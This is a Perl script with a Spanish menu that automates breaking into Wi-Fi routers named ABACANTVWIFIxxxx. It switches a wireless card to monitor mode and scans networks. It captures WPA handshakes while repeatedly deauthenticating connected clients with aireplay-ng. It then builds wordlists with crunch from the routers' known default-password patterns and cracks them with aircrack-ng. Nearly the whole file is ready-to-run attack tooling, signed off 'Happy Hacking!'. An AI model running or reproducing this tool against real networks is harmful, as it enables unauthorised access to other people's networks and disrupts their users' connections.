#! /usr/bin/perl
use Switch;

sub main(){
system "clear";
print"\033[031mADVERTENCIA! Para correr este script necesitas ser usuario ROOT \n\n \033[34m";
system "sleep 2";
system "clear";

print "-------------------------------------------------------\n";
print "--                                                   --\n";
print "--                                                   --\n";
print "--                   Script By NyxZ3n                --\n";
print "--                                                   --\n";
print "--     Este script automatiza la fuerza bruta        --\n";
print "--       hacia los routers ABACANTVWIFIxxxx          --\n";
print "--   haciendo uso de las passwords predeterminadas   --\n";
print "--                                                   --\n";
print "--                                                   --\n";
print "-------------------------------------------------------\n";
print "\n\n\n";
print "1. Escanear Redes & Capturar HandShake \n";
print "2. Atacar HandShake & Crear/Usar Diccionario \n";
print "3. Ver HandShakes disponibles y/o recolectados \n";
print "4. Salir \033[36m";
print "\n\n";
$opcion = <>;
chomp $opcion;
}
sub Mon{
		system "sudo service networking stop";
		system "sudo service network-manager stop";
		system "sudo ifconfig '$WIRELESS' down";
		system "sudo iwconfig '$WIRELESS' mode monitor";
		system "sudo ifconfig '$WIRELESS' up";
	}

sub Mangd{	
		system "sudo service networking start";
		system "sudo service network-manager start";
		system "sudo ifconfig '$WIRELESS' down";
		system "sudo iwconfig '$WIRELESS' mode managed";
		system "sudo ifconfig '$WIRELESS' up";
	}

sub Scan{
		system "clear";
		print "\e[36mIniciando Escaneo de Redes \033[0m";
		system "sleep 1";
		system "sudo airodump-ng '$WIRELESS' --manufacturer";
	}

sub Handshake{
		print "\n\n";
		print "\033[36mCapturar HandShake \033[0m\n";
		print "\n BSSID de la red: ";
		$BSSID=<>;
		chomp $BSSID;
		print "\n Channel de la red: ";
		$CHANNEL=<>;
		chomp $CHANNEL;
		print "\n Nombre del HandShake: ";
		$HandShake =<>;
		chomp $HandShake;
		print "\n Tiempo de escucha en segundos (ej 15): ";
		$TIEMPO=<>;
		chomp $TIEMPO;
		$TIEMPO2="'${TIEMPO}'s";
		$TIEMPO3=$TIEMPO + 3;
		system "sleep 1";
		system "clear";
	
		print "Comenzando Captura \n";
		system "sleep 1";
		system "clear";
		$AIRODUMP="timeout '$TIEMPO2' airodump-ng --ig -w '$HandShake' -c '$CHANNEL' --bssid '$BSSID' '$WIRELESS' --manufacturer &timeout '$TIEMPO2' xterm -hold -e \"while true; do sleep 5; aireplay-ng -0 5 -q 2 --ig -a '$BSSID' '$WIRELESS'; done\"";
		system $AIRODUMP;
		system "mv '${HandShake}*.cap' '${HandShake}.cap'";
		system "sudo rm *.kismet.*";
		system "sudo rm *.csv";
		print "\n\n";
		system "clear";
		print "HandShake Capturado(s/n)?";
		print "\n";
		$SI = <>;
		if($SI == 's'){
		print "Restaurando interfaz '$WIRELESS'";
		Mangd();
		system"sleep 2";
		main();
		
		;}else{ Handshake();}
	}
		
sub SwitchF(){

switch($opcion){

	case "1" {
	
	system("sleep 1");
	system("clear");

	system "sudo iwconfig";
        print"\e[36mPor favor introduce tu tarjeta wireless: \e[0m";
        $WIRELESS = <>;
        chomp $WIRELESS;
	print "\n";
	print "Presione CTRL + C para detener el escaneo";
	system "sleep 3";
	
	Mon();
	Scan();
	Handshake();	
}
	case "2"{
	system("sleep 2");
	system("clear");	
	
	print "\033[33m---------------------------------------------------------------------\n";
	print "--                                                                 --\n";
	print "--  1.Charset 85047928%%%%%%       (15 Minutos Aproximadamente)    --\n";
	print "--  2.Charset 85047929%%%%%%       (15 Minutos Aproximadamente)    --\n";
	print "--  3.Charset 8504792%%%%%%%       (1 Hora Aproximadamente    )    --\n";
	print "--                                                                 --\n";
	print "---------------------------------------------------------------------\n";
	
	$optdic = <>;
	chomp $optdic;
	switch($optdic){
	
	case "1"{
	system "clear";
	print "\n";
	print "\033[36m Nombre del diccionario: ";
	$DIC = <>;
	chomp $DIC;
	print "\n\n";
	print "\033[36m Nombre del HandShake: \n\n";
	print "\033[36m\n";
	system "ls | grep -e .cap";
	$HandShake1 =<>;
	
	system "crunch 14 14 -t 85047928%%%%%% -o '$DIC'";
	system "aircrack-ng -w '$DIC' '$HandShake1'";
	}

	case "2"{
	system ("clear");
	print"\n";
        print "\033[36m Nombre del diccionario: ";
        $DIC2 = <>;
	chomp $DIC2;  
	print "\n\n";
	print "\033[36m Nombre del HandShake: \n\n";
	print "\033[0m";
        system "ls | grep -e .cap";
	print "\033[36m\n";
        $HandShake1 =<>;

        system "crunch 14 14 -t 85047929%%%%%% -o '$DIC2'";
        system "aircrack-ng -w '$DIC2' '$HandShake1'";
        }

	case "3"{
	system ("clear");
        print "\033[36m Nombre del diccionario: ";
        $DIC3 = <>; 
	chomp $DIC3; 
	print "\n\n";
	print "\033[36m Nombre del HandShake: \n\n";
        print "\033[0m";
        system "ls | grep -e .cap";
	print"\033[36m\n";
        $HandShake1 =<>;
        system "crunch 14 14 -t 8504792%%%%%%% -o '$DIC3'";
        system "aircrack-ng -w '$DIC3' '$HandShake1'";
        }

	
	}	
}
	case "3"{
	
	system("sudo aircrack-ng *.cap");
	}

	case "4"{
	system "clear";
	print "\033[31mHappy Hacking!";
	system"sleep 1";
	system"clear";
	
	}
	
	else  {print "Selecciona una opción válida.";}

}
}
main();
SwitchF();
